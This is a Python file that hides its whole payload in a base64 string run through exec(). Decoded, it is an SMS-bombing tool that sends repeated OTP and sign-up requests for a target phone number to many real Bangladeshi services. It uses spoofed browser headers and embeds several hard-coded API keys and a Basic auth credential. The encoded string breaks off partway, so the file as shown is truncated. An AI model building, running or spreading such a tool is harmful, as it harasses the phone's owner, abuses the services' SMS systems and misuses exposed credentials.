import base64
exec(base64.b64decode('aW1wb3J0IHJlcXVlc3RzCmltcG9ydCB0aW1lCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBzaHV0aWwKaW1wb3J0IGluc3BlY3QKaW1wb3J0IHN5cwpmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlLCBTdHlsZSwgaW5pdAoKaW5pdChhdXRvcmVzZXQ9VHJ1ZSkKCnNtc19iYW5uZXJfbGluZXMgPSBbCiAgICAiICBfX19fX18gICAgICBfX19fICAgIF9fX18gICAgIF9fX19fXyAgICIsCiAgICAiLicgX19fXyBcXCAgICB8XyAgIFxcICAvICAgX3wgIC4nIF9fX18gXFwgICIsCiAgICAifCAoX19fIFxcX3wgICAgIHwgICBcXC8gICB8ICAgIHwgKF9fXyBcXF98ICIsCiAgICAiIF8uX19fX2AuICAgICAgfCB8XFwgIC98IHwgICAgIF8uX19fX2AuICAiLAogICAgInwgXFxfX19fKSB8IF8gIF98IHxfXFwvfF98IHxfICB8IFxcX19fXykgfCAiLAogICAgIiBcXF9fX19fXy4nJyhfKXxfX19fX3x8X19fX198ICBcXF9fX19fXy4nICIKXQoKZGVmIGNsZWFyX3NjcmVlbigpOgogICAgc3VicHJvY2Vzcy5jYWxsKCJjbHMiIGlmIHN1YnByb2Nlc3Mub3MubmFtZSA9PSAibnQiIGVsc2UgImNsZWFyIiwgc2hlbGw9VHJ1ZSkKCmRlZiBhbmltYXRlX2Jhbm5lcigpOgogICAgY2xlYXJfc2NyZWVuKCkKICAgIHRlcm1fd2lkdGggPSBzaHV0aWwuZ2V0X3Rlcm1pbmFsX3NpemUoZmFsbGJhY2s9KDgwLCAyMCkpLmNvbHVtbnMKICAgIGZvciBfIGluIHJhbmdlKDUpOgogICAgICAgIHByaW50KCkKICAgIGZvciBsaW5lIGluIHNtc19iYW5uZXJfbGluZXM6CiAgICAgICAgcHJpbnQoRm9yZS5DWUFOICsgU3R5bGUuQlJJR0hUICsgbGluZS5jZW50ZXIodGVybV93aWR0aCkpCiAgICAgICAgdGltZS5zbGVlcCgwLjE1KQogICAgcHJpbnQoIlxuIikKCiMgPT09PT09PT09PT09PT09PT09PT09IEFQSSBGVU5DVElPTlMgPT09PT09PT09PT09PT09PT09PT09CmRlZiBjYWxsX2Fjc19hcGkocGhvbmVfbnVtYmVyKToKICAgIHVybCA9ICJodHRwczovL2F1dGguYWNzZnV0dXJlc2Nob29sLmNvbS9hcGkvdjEvb3RwL3NlbmQiCgogICAgaGVhZGVycyA9IHsKICAgICAgICAiYXV0aG9yaXR5IjogImF1dGguYWNzZnV0dXJlc2Nob29sLmNvbSIsCiAgICAgICAgImFjY2VwdCI6ICJhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L3BsYWluLCAqLyoiLAogICAgICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiAiZW4tVVMsZW47cT0wLjkiLAogICAgICAgICJjb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIm9yaWdpbiI6ICJodHRwczovL3d3dy5hY3NmdXR1cmVzY2hvb2wuY29tIiwKICAgICAgICAicmVmZXJlciI6ICJodHRwczovL3d3dy5hY3NmdXR1cmVzY2hvb2wuY29tLyIsCiAgICAgICAgInNlYy1jaC11YSI6ICciQ2hyb21pdW0iO3Y9IjEzNyIsICJOb3QvQSlCcmFuZCI7dj0iMjQiJywKICAgICAgICAic2VjLWNoLXVhLW1vYmlsZSI6ICI/MSIsCiAgICAgICAgInNlYy1jaC11YS1wbGF0Zm9ybSI6ICciQW5kcm9pZCInLAogICAgICAgICJzZWMtZmV0Y2gtZGVzdCI6ICJlbXB0eSIsCiAgICAgICAgInNlYy1mZXRjaC1tb2RlIjogImNvcnMiLAogICAgICAgICJzZWMtZmV0Y2gtc2l0ZSI6ICJzYW1lLXNpdGUiLAogICAgICAgICJ1c2VyLWFnZW50IjogIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgSykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIKICAgIH0KCiAgICBwYXlsb2FkID0gewogICAgICAgICJwaG9uZSI6IHBob25lX251bWJlcgogICAgfQoKICAgIHRyeToKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBoZWFkZXJzPWhlYWRlcnMsIGpzb249cGF5bG9hZCkKICAgICAgICByZXR1cm4gcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5SZXF1ZXN0RXhjZXB0aW9uOgogICAgICAgIHJldHVybiBGYWxzZQoKZGVmIGNhbGxfYmlrcm95X2FwaShwaG9uZV9udW1iZXIpOgogICAgdXJsID0gZiJodHRwczovL2Jpa3JveS5jb20vZGF0YS9waG9uZV9udW1iZXJfbG9naW4vdmVyaWZpY2F0aW9ucy9waG9uZV9sb2dpbj9waG9uZT17cGhvbmVfbnVtYmVyfSIKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTM3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwKICAgICAgICAiUmVmZXJlciI6ICJodHRwczovL2Jpa3JveS5jb20vIiwKICAgICAgICAiQWNjZXB0IjogImFwcGxpY2F0aW9uL2pzb24sIHRleHQvcGxhaW4sICovKiIsCiAgICB9CiAgICB0cnk6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgcmV0dXJuIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMAogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbjoKICAgICAgICByZXR1cm4gRmFsc2UKCmRlZiBjYWxsX2NhbGxfYXBpKG1vYmlsZV9udW1iZXIpOgogICAgdXJsID0gZiJodHRwczovL2NhbGwtYXBpLXZodHgub25yZW5kZXIuY29tL3Ntcy9hcGkvdjE/bnVtPXttb2JpbGVfbnVtYmVyfSIKICAgIHRyeToKICAgICAgICByZXR1cm4gcmVxdWVzdHMuZ2V0KHVybCkuc3RhdHVzX2NvZGUgPT0gMjAwCiAgICBleGNlcHQ6CiAgICAgICAgcmV0dXJuIEZhbHNlCgpkZWYgY2FsbF9ob2ljaG9pX2FwaShtb2JpbGVfbnVtYmVyKToKICAgIHBob25lID0gIis4OCIgKyBtb2JpbGVfbnVtYmVyCiAgICB1cmwgPSAiaHR0cHM6Ly9wcm9kLWFwaS52aWV3bGlmdC5jb20vaWRlbnRpdHkvc2lnbnVwP3NpdGU9aG9pY2hvaXR2JmRldmljZUlkPWJyb3dzZXItMGY5ZDA5NTYtMWY0OS0yNDhmLWYxNmUtMWVhN2Q5OWIxZGE4IgogICAgaGVhZGVycyA9IHsKICAgICAgICAiYWNjZXB0IjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJjb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIm9yaWdpbiI6ICJodHRwczovL3d3dy5ob2ljaG9pLnR2IiwKICAgICAgICAicmVmZXJlciI6ICJodHRwczovL3d3dy5ob2ljaG9pLnR2LyIsCiAgICAgICAgInVzZXItYWdlbnQiOiAiTW96aWxsYS81LjAiLAogICAgICAgICJ4LWFwaS1rZXkiOiAiUEJTb29VZTkxczdSTlJLblhUbVFHN3ozZ3dEMmFEVEE2VGxKcDZlZiIKICAgIH0KICAgIHBheWxvYWQgPSB7CiAgICAgICAgInBob25lTnVtYmVyIjogcGhvbmUsCiAgICAgICAgInJlcXVlc3RUeXBlIjogInNlbmQiLAogICAgICAgICJ3aGF0c2FwcENvbnNlbnQiOiBUcnVlCiAgICB9CiAgICB0cnk6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzLCBqc29uPXBheWxvYWQpCiAgICAgICAgcmV0dXJuIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMAogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKZGVmIGNhbGxfYXBleF9hcGkocGhvbmVfbnVtYmVyKToKICAgIHVybCA9ICdodHRwczovL2FwaS5hcGV4NHUuY29tL2FwaS9hdXRoL2xvZ2luJwogICAgaGVhZGVycyA9IHsKICAgICAgICAnYXV0aG9yaXR5JzogJ2FwaS5hcGV4NHUuY29tJywKICAgICAgICAnYWNjZXB0JzogJ2FwcGxpY2F0aW9uL2pzb24sIHRleHQvcGxhaW4sICovKicsCiAgICAgICAgJ2FjY2VwdC1sYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOScsCiAgICAgICAgJ2NvbnRlbnQtdHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJywKICAgICAgICAnb3JpZ2luJzogJ2h0dHBzOi8vYXBleDR1LmNvbScsCiAgICAgICAgJ3JlZmVyZXInOiAnaHR0cHM6Ly9hcGV4NHUuY29tLycsCiAgICAgICAgJ3NlYy1jaC11YSc6ICciQ2hyb21pdW0iO3Y9IjEzNyIsICJOb3QvQSlCcmFuZCI7dj0iMjQiJywKICAgICAgICAnc2VjLWNoLXVhLW1vYmlsZSc6ICc/MScsCiAgICAgICAgJ3NlYy1jaC11YS1wbGF0Zm9ybSc6ICciQW5kcm9pZCInLAogICAgICAgICd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgSykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsCiAgICB9CiAgICBwYXlsb2FkID0gewogICAgICAgICdwaG9uZU51bWJlcic6IHBob25lX251bWJlcgogICAgfQogICAgdHJ5OgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGhlYWRlcnM9aGVhZGVycywganNvbj1wYXlsb2FkKQogICAgICAgIHJlc3BvbnNlLnJhaXNlX2Zvcl9zdGF0dXMoKQogICAgICAgIHJldHVybiByZXNwb25zZS5qc29uKCkKICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLlJlcXVlc3RFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIkVycm9yIGR1cmluZyBBUEkgY2FsbDoge2V9IikKICAgICAgICByZXR1cm4gTm9uZQoKZGVmIGNhbGxfZ3BmaV9hcGkocGhvbmVfbnVtYmVyKToKICAgIHVybCA9ICdodHRwczovL2dwZmktYXBpLmdyYW1lZW5waG9uZS5jb20vYXBpL3YxL2Z3YS9yZXF1ZXN0LWZvci1vdHAnCiAgICBoZWFkZXJzID0gewogICAgICAgICdBY2NlcHQnOiAnYXBwbGljYXRpb24vanNvbiwgdGV4dC9wbGFpbiwgKi8qJywKICAgICAgICAnQWNjZXB0LUxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45JywKICAgICAgICAnQXV0aG9yaXphdGlvbic6ICdCYXNpYyBibVZ0YjJKc2RXVTZRWEJwVlhObGNrQkhVRVpwJywKICAgICAgICAnQ29ubmVjdGlvbic6ICdrZWVwLWFsaXZlJywKICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLAogICAgICAgICdPcmlnaW4nOiAnaHR0cHM6Ly9ncGZpLmdyYW1lZW5waG9uZS5jb20nLAogICAgICAgICdSZWZlcmVyJzogJ2h0dHBzOi8vZ3BmaS5ncmFtZWVucGhvbmUuY29tLycsCiAgICAgICAgJ1NlYy1GZXRjaC1EZXN0JzogJ2VtcHR5JywKICAgICAgICAnU2VjLUZldGNoLU1vZGUnOiAnY29ycycsCiAgICAgICAgJ1NlYy1GZXRjaC1TaXRlJzogJ3NhbWUtc2l0ZScsCiAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTM3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2JywKICAgICAgICAnc2VjLWNoLXVhJzogJyJDaHJvbWl1bSI7dj0iMTM3IiwgIk5vdC9BKUJyYW5kIjt2PSIyNCInLAogICAgICAgICdzZWMtY2gtdWEtbW9iaWxlJzogJz8xJywKICAgICAgICAnc2VjLWNoLXVhLXBsYXRmb3JtJzogJyJBbmRyb2lkIicsCiAgICB9CiAgICBwYXlsb2FkID0gewogICAgICAgICdwaG9uZSc6IHBob25lX251bWJlciwKICAgICAgICAnZW1haWwnOiAnJywKICAgICAgICAnbGFuZ3VhZ2UnOiAnZW4nCiAgICB9CiAgICB0cnk6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzLCBqc29uPXBheWxvYWQpCiAgICAgICAgcmVzcG9uc2UucmFpc2VfZm9yX3N0YXR1cygpCiAgICAgICAgcmV0dXJuIHJlc3BvbnNlLmpzb24oKQogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiRXJyb3IgZHVyaW5nIEdQRkkgQVBJIGNhbGw6IHtlfSIpCiAgICAgICAgcmV0dXJuIE5vbmUKCmRlZiBjYWxsX2dob29yaV9hcGkocGhvbmVfbnVtYmVyKToKICAgIHVybCA9ICJodHRwczovL2FwaS5naG9vcmlsZWFybmluZy5jb20vYXBpL2F1dGgvc2lnbnVwL290cD9fYXBwX3BsYXRmb3JtPXdlYiIKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgImF1dGhvcml0eSI6ICJhcGkuZ2hvb3JpbGVhcm5pbmcuY29tIiwKICAgICAgICAiYWNjZXB0IjogImFwcGxpY2F0aW9uL2pzb24sIHRleHQvcGxhaW4sICovKiIsCiAgICAgICAgImFjY2VwdC1sYW5ndWFnZSI6ICJlbi1VUyxlbjtxPTAuOSIsCiAgICAgICAgImNvbnRlbnQtdHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAib3JpZ2luIjogImh0dHBzOi8vZ2hvb3JpbGVhcm5pbmcuY29tIiwKICAgICAgICAicmVmZXJlciI6ICJodHRwczovL2dob29yaWxlYXJuaW5nLmNvbS8iLAogICAgICAgICJzZWMtY2gtdWEiOiAnIkNocm9taXVtIjt2PSIxMzciLCAiTm90L0EpQnJhbmQiO3Y9IjI0IicsCiAgICAgICAgInNlYy1jaC11YS1tb2JpbGUiOiAiPzEiLAogICAgICAgICJzZWMtY2gtdWEtcGxhdGZvcm0iOiAnIkFuZHJvaWQiJywKICAgICAgICAic2VjLWZldGNoLWRlc3QiOiAiZW1wdHkiLAogICAgICAgICJzZWMtZmV0Y2gtbW9kZSI6ICJjb3JzIiwKICAgICAgICAic2VjLWZldGNoLXNpdGUiOiAic2FtZS1zaXRlIiwKICAgICAgICAidXNlci1hZ2VudCI6ICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IEspIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzcuMC4wLjAgTW9iaWxlIFNhZmFyaS81MzcuMzYiCiAgICB9CiAgICBwYXlsb2FkID0gewogICAgICAgICJtb2JpbGVfbm8iOiBwaG9uZV9udW1iZXIKICAgIH0KCiAgICB0cnk6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzLCBqc29uPXBheWxvYWQpCiAgICAgICAgcmV0dXJuIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMAogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbjoKICAgICAgICByZXR1cm4gRmFsc2UKCmRlZiBjYWxsX2Vhc3lfYXBpKHBob25lX251bWJlcik6CiAgICB1cmwgPSAiaHR0cHM6Ly9jb3JlLmVhc3kuY29tLmJkL2FwaS92MS9yZWdpc3RyYXRpb24iCiAgICBoZWFkZXJzID0gewogICAgICAgICJBY2NlcHQiOiAiYXBwbGljYXRpb24vanNvbiwgdGV4dC9wbGFpbiwgKi8qIiwKICAgICAgICAiQWNjZXB0LUxhbmd1YWdlIjogImVuLVVTLGVuO3E9MC45IiwKICAgICAgICAiQ29ubmVjdGlvbiI6ICJrZWVwLWFsaXZlIiwKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJPcmlnaW4iOiAiaHR0cHM6Ly9lYXN5LmNvbS5iZCIsCiAgICAgICAgIlJlZmVyZXIiOiAiaHR0cHM6Ly9lYXN5LmNvbS5iZC8iLAogICAgICAgICJTZWMtRmV0Y2gtRGVzdCI6ICJlbXB0eSIsCiAgICAgICAgIlNlYy1GZXRjaC1Nb2RlIjogImNvcnMiLAogICAgICAgICJTZWMtRmV0Y2gtU2l0ZSI6ICJzYW1lLXNpdGUiLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgSykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsCiAgICAgICAgImRldmljZS1rZXkiOiAiZjNhYTVhY2FmMTdkZTY0ZGI3ZDgyYTAwYzczMTc4YWYiLAogICAgICAgICJsYW5nIjogImVuIiwKICAgICAgICAic2VjLWNoLXVhIjogJyJDaHJvbWl1bSI7dj0iMTM3IiwgIk5vdC9BKUJyYW5kIjt2PSIyNCInLAogICAgICAgICJzZWMtY2gtdWEtbW9iaWxlIjogIj8xIiwKICAgICAgICAic2VjLWNoLXVhLXBsYXRmb3JtIjogJyJBbmRyb2lkIicKICAgIH0KICAgIHBheWxvYWQgPSB7CiAgICAgICAgInNvY2lhbF9sb2dpbl9pZCI6ICIiLAogICAgICAgICJuYW1lIjogIlJycnIiLAogICAgICAgICJlbWFpbCI6ICJnb29nbGVAZ21haWwuY29tIiwKICAgICAgICAibW9iaWxlIjogcGhvbmVfbnVtYmVyLAogICAgICAgICJwYXNzd29yZCI6ICIxMjM0NTY3OCIsCiAgICAgICAgInBhc3N3b3JkX2NvbmZpcm1hdGlvbiI6ICIxMjM0NTY3OCIsCiAgICAgICAgImRldmljZV9rZXkiOiAiZjNhYTVhY2FmMTdkZTY0ZGI3ZDgyYTAwYzczMTc4YWYiCiAgICB9CgogICAgdHJ5OgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGhlYWRlcnM9aGVhZGVycywganNvbj1wYXlsb2FkKQogICAgICAgIHJldHVybiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDAKICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLlJlcXVlc3RFeGNlcHRpb246CiAgICAgICAgcmV0dXJuIEZhbHNlCgpkZWYgY2FsbF9zdW5kYXJiYW5fYXBpKHBob25lX251bWJlcik6CiAgICB1cmwgPSAiaHR0cHM6Ly9hcGktZ2F0ZXdheS5zdW5kYXJiYW5jb3VyaWVybHRkLmNvbS9ncmFwaHFsIgogICAgaGVhZGVycyA9IHsKICAgICAgICAiYXV0aG9yaXR5IjogImFwaS1nYXRld2F5LnN1bmRhcmJhbmNvdXJpZXJsdGQuY29tIiwKICAgICAgICAiYWNjZXB0IjogIiovKiIsCiAgICAgICAgImFjY2VwdC1sYW5ndWFnZSI6ICJlbi1VUyxlbjtxPTAuOSIsCiAgICAgICAgImF1dGhvcml6YXRpb24iOiAiIiwgICMgTGVmdCBibGFuayBhcyBpbiBjdXJsCiAgICAgICAgImNvbnRlbnQtdHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAib3JpZ2luIjogImh0dHBzOi8vY3VzdG9tZXIuc3VuZGFyYmFuY291cmllcmx0ZC5jb20iLAogICAgICAgICJyZWZlcmVyIjogImh0dHBzOi8vY3VzdG9tZXIuc3VuZGFyYmFuY291cmllcmx0ZC5jb20vIiwKICAgICAgICAic2VjLWNoLXVhIjogJyJDaHJvbWl1bSI7dj0iMTM3IiwgIk5vdC9BKUJyYW5kIjt2PSIyNCInLAogICAgICAgICJzZWMtY2gtdWEtbW9iaWxlIjogIj8xIiwKICAgICAgICAic2VjLWNoLXVhLXBsYXRmb3JtIjogJyJBbmRyb2lkIicsCiAgICAgICAgInNlYy1mZXRjaC1kZXN0IjogImVtcHR5IiwKICAgICAgICAic2VjLWZldGNoLW1vZGUiOiAiY29ycyIsCiAgICAgICAgInNlYy1mZXRjaC1zaXRlIjogInNhbWUtc2l0ZSIsCiAgICAgICAgInVzZXItYWdlbnQiOiAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTM3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IgogICAgfQoKICAgIHBheWxvYWQgPSB7CiAgICAgICAgIm9wZXJhdGlvbk5hbWUiOiAiQ3JlYXRlQWNjZXNzVG9rZW4iLAogICAgICAgICJ2YXJpYWJsZXMiOiB7CiAgICAgICAgICAgICJhY2Nlc3NUb2tlbkZpbHRlciI6IHsKICAgICAgICAgICAgICAgICJ1c2VyTmFtZSI6IHBob25lX251bWJlcgogICAgICAgICAgICB9CiAgICAgICAgfSwKICAgICAgICAicXVlcnkiOiAiIiJtdXRhdGlvbiBDcmVhdGVBY2Nlc3NUb2tlbigkYWNjZXNzVG9rZW5GaWx0ZXI6IEFjY2Vzc1Rva2VuSW5wdXQhKSB7CiAgY3JlYXRlQWNjZXNzVG9rZW4oYWNjZXNzVG9rZW5GaWx0ZXI6ICRhY2Nlc3NUb2tlbkZpbHRlcikgewogICAgbWVzc2FnZQogICAgc3RhdHVzQ29kZQogICAgcmVzdWx0IHsKICAgICAgcGhvbmUKICAgICAgb3RwQ291bnRlcgogICAgICBfX3R5cGVuYW1lCiAgICB9CiAgICBfX3R5cGVuYW1lCiAgfQp9IiIiCiAgICB9CgogICAgdHJ5OgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGhlYWRlcnM9aGVhZGVycywganNvbj1wYXlsb2FkKQogICAgICAgIHJldHVybiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDAKICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLlJlcXVlc3RFeGNlcHRpb246CiAgICAgICAgcmV0dXJuIEZhbHNlCgpkZWYgY2FsbF9xdWl6Z2lyaV9hcGkocGhvbmVfbnVtYmVyKToKICAgIHVybCA9ICJodHRwczovL2RldmVsb3Blci5xdWl6Z2lyaS54eXovYXBpL3YyLjAvc2VuZC1vdHAiCiAgICBoZWFkZXJzID0gewogICAgICAgICJBY2NlcHQiOiAiKi8qIiwKICAgICAgICAiQWNjZXB0LUxhbmd1YWdlIjogImVuLVVTLGVuO3E9MC45IiwKICAgICAgICAiQ29ubmVjdGlvbiI6ICJrZWVwLWFsaXZlIiwKICAgICAgICAiQ29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRmLTgiLAogICAgICAgICJPcmlnaW4iOiAiaHR0cHM6Ly9hcHAucXVpemdpcmkuY29tLmJkIiwKICAgICAgICAiUmVmZXJlciI6ICJodHRwczovL2FwcC5xdWl6Z2lyaS5jb20uYmQvIiwKICAgICAgICAiU2VjLUZldGNoLURlc3QiOiAiZW1wdHkiLAogICAgICAgICJTZWMtRmV0Y2gtTW9kZSI6ICJjb3JzIiwKICAgICAgICAiU2VjLUZldGNoLVNpdGUiOiAiY3Jvc3Mtc2l0ZSIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTM3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwKICAgICAgICAiWC1SZXF1ZXN0ZWQtV2l0aCI6ICJYTUxIdHRwUmVxdWVzdCIsCiAgICAgICAgInNlYy1jaC11YSI6ICciQ2hyb21pdW0iO3Y9IjEzNyIsICJOb3QvQSlCcmFuZCI7dj0iMjQiJywKICAgICAgICAic2VjLWNoLXVhLW1vYmlsZSI6ICI/MSIsCiAgICAgICAgInNlYy1jaC11YS1wbGF0Zm9ybSI6ICciQW5kcm9pZCInLAogICAgICAgICJ4LWFwaS1rZXkiOiAiZ1lzaU5TVkJEdUN0OHlNVVhwRjA2aVExZURyTUd2NkciCiAgICB9CgogICAgcGF5bG9hZCA9IHsKICAgICAgICAicGhvbmUiOiBwaG9uZV9udW1iZXIsCiAgICAgICAgImNvdW50cnlfY29kZSI6ICIrODgiLAogICAgICAgICJmY21fdG9rZW4iOiBOb25lCiAgICB9CgogICAgdHJ5OgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGhlYWRlcnM9aGVhZGVycywganNvbj1wYXlsb2FkKQogICAgICAgIHJldHVybiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDAKICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLlJlcXVlc3RFeGNlcHRpb24gYXMgZToKICAgICAgICByZXR1cm4gRmFsc2UKCmRlZiBjYWxsX3JvbW9uaV9hcGkocGhvbmVfbnVtYmVyKToKICAgIHVybCA9IGYiaHR0cHM6Ly9yb21vbmkuY29tLmJkL2FwaS9zZW5kLW90cD9waG9uZT17cGhvbmVfbnVtYmVyfSIKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgImF1dGhvcml0eSI6ICJyb21vbmkuY29tLmJkIiwKICAgICAgICAiYWNjZXB0IjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJhY2NlcHQtbGFuZ3VhZ2UiOiAiZW4tVVMsZW47cT0wLjkiLAogICAgICAgICJjb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgInJlZmVyZXIiOiAiaHR0cHM6Ly9yb21vbmkuY29tLmJkL3NpZ251cCIsCiAgICAgICAgInNlYy1jaC11YSI6ICciQ2hyb21pdW0iO3Y9IjEzNyIsICJOb3QvQSlCcmFuZCI7dj0iMjQiJywKICAgICAgICAic2VjLWNoLXVhLW1vYmlsZSI6ICI/MSIsCiAgICAgICAgInNlYy1jaC11YS1wbGF0Zm9ybSI6ICciQW5kcm9pZCInLAogICAgICAgICJzZWMtZmV0Y2gtZGVzdCI6ICJlbXB0eSIsCiAgICAgICAgInNlYy1mZXRjaC1tb2RlIjogImNvcnMiLAogICAgICAgICJzZWMtZmV0Y2gtc2l0ZSI6ICJzYW1lLW9yaWdpbiIsCiAgICAgICAgInVzZXItYWdlbnQiOiAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTM3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwKICAgICAgICAjIENvb2tpZSBub3QgcmVxdWlyZWQgdW5sZXNzIHlvdSB3YW50IHRvIHNpbXVsYXRlIGEgbG9nZ2VkLWluIHNlc3Npb24KICAgIH0KCiAgICB0cnk6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsLCBoZWFkZXJzPWhlYWRlcnMpICAKICAgICAgICByZXR1cm4gcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5SZXF1ZXN0RXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcmV0dXJuIEZhbHNlCgpkZWYgY2FsbF9iZHRpY2tldHNfYXBpKHBob25lX251bWJlcik6CiAgICB1cmwgPSAiaHR0cHM6Ly9hcGkuYmR0aWNrZXRzLmNvbToyMDEwMC92MS9hdXRoIgogICAgaGVhZGVycyA9IHsKICAgICAgICAiYXV0aG9yaXR5IjogImFwaS5iZHRpY2tldHMuY29tOjIwMTAwIiwKICAgICAgICAiYWNjZXB0IjogImFwcGxpY2F0aW9uL2pzb24sIHRleHQvcGxhaW4sICovKiIsCiAgICAgICAgImFjY2VwdC1sYW5ndWFnZSI6ICJlbi1VUyxlbjtxPTAuOSIsCiAgICAgICAgImNvbnRlbnQtdHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAib3JpZ2luIjogImh0dHBzOi8vYmR0aWNrZXRzLmNvbSIsCiAgICAgICAgInJlZmVyZXIiOiAiaHR0cHM6Ly9iZHRpY2tldHMuY29tLyIsCiAgICAgICAgInNlYy1jaC11YSI6ICciQ2hyb21pdW0iO3Y9IjEzNyIsICJOb3QvQSlCcmFuZCI7dj0iMjQiJywKICAgICAgI